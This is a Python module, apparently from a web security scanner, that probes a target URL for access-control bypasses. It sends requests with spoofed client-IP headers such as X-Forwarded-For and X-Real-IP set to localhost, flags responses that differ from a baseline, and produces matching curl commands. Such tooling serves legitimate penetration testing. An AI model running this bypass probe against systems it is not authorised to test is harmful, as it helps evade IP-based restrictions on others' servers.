from concurrent.futures import ThreadPoolExecutor
import requests

ORIGIN_IPS = ["127.0.0.1", "localhost"]

BYPASS_HEADERS = [
    "Access-Control-Allow-Origin",
    "Client-IP",
    "Forwarded",
    "Forwarded-For",
    "Forwarded-For-IP",
    "Origin",
    "X-Client-IP",
    "X-Forwarded",
    "X-Forwarded-By",
    "X-Forwarded-For",
    "X-Forwarded-For-Original",
    "X-Forwarded-Host",
    "X-Remote-Addr",
    "X-Originating-IP",
    "X-Remote-IP",
    "Cluster-Client-IP",
    "CF-Connecting-Ip",
    "X-Real-IP",
    "True-Client-IP",
]


def test_bypass(results, target, header_name, header_value, original_request):
    http_headers = {}
    http_headers[header_name] = header_value
    r = requests.get(
        url=target,
        allow_redirects=True,
        stream=True,
        headers=http_headers,
    )
    if r.status_code != original_request.status_code or len(r.text) != len(original_request.text):
        results.append(
            {
                "header": f"{header_name}: {header_value}",
                "status_code": r.status_code,
                "length": len(r.text),
                "curl": 'curl -k "%s" -H "%s: %s" '
                % (
                    target,
                    header_name,
                    header_value,
                ),
            }
        )


def test_bypass_all(target, ip, original_request):
    http_headers = {}
    for h in BYPASS_HEADERS:
        http_headers[h] = ip
    r = requests.get(
        url=target,
        allow_redirects=True,
        stream=True,
        headers=http_headers,
    )
    return r.status_code != original_request.status_code or len(r.text) != len(original_request.text)


def start(target: str):
    results = []
    original_request = requests.get(
        url=target,
        allow_redirects=True,
        stream=True,
    )
    # Waits for all the threads to be completed
    for ip in ORIGIN_IPS:
        if test_bypass_all(target, ip, original_request):
            with ThreadPoolExecutor(max_workers=min(6, len(BYPASS_HEADERS))) as tp:
                for bph in sorted(BYPASS_HEADERS, key=lambda x: x):
                    tp.submit(test_bypass, results, target, bph, ip, original_request)
    return results
